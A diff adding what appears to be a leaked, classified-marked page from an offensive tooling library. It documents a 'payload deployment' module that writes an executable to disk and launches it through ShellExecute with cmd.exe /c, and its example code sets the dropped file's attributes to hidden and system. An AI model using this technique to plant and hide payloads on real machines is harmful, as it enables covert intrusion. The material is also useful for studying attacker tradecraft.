@@ -1,0 +1,61 @@
+
+                        Create Process Via ShellExecute (ShellExecute_CRS - Chorus)
+SECRET//NOFORN
+ 
+OSB Library: Payload Deployment
+
+Module Name: ShellExecute_CRS - Chorus
+ 
+Module Description: This module uses the Shell Execute Windows APIApplication Programming Interface call to create a process. No handle to the created process is returned with this module. The payload, if supplied is written to a user configurable location with user configurable attributes. Cmd.exe /C is added as a prefix to the ShellExecute command.
+ 
+PSP/OS Issues: PSPs should be tested on a per tool basis.
+ 
+('excerpt' missing)
+ 
+Sharing Level: Liaison (well known technique)
+ 
+Technique Origin: Internet/open-source (well-defined Windows APIApplication Programming Interface)
+ 
+Notes: 
+
+No handle to the created process is returned
+cmd.exe /c is prepended to the command string supplied by the target path and arguments
+Quotes are placed around the Target Path in the command line
+
+ 
+Module Specific Structures:
+
+struct PARAM_CRS
+{
+	WCHAR *wcArgs;		//The arguments to the executable being executed
+	DWORD dwAttribs;	//The attributes of the target payload on disk
+	WCHAR *wcTarget;	//The target path of the executable to drop to disk
+};
+
+
+ 
+ 
+Example Code:
+ 
+HANDLE hHandle = NULL;
+
+
+IPayload *myPayload = new ShellExecute_CRS();
+
+
+PARAM_CRS params;
+params.dwAttribs = FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM;
+params.wcTarget = L"C:\\Test Folder\\MyTest.exe";
+params.wcArgs = L"1 2 3";
+
+
+IPayload::PayloadErr pErr = myPayload->execute(improvedDummy, sizeof(improvedDummy), ¶ms, sizeof(params), &hHandle);
+ 
+ 
+SECRET//NOFORN
+
+Previous versions:
+| 1 SECRET
+| 2 SECRET
+|
+                    
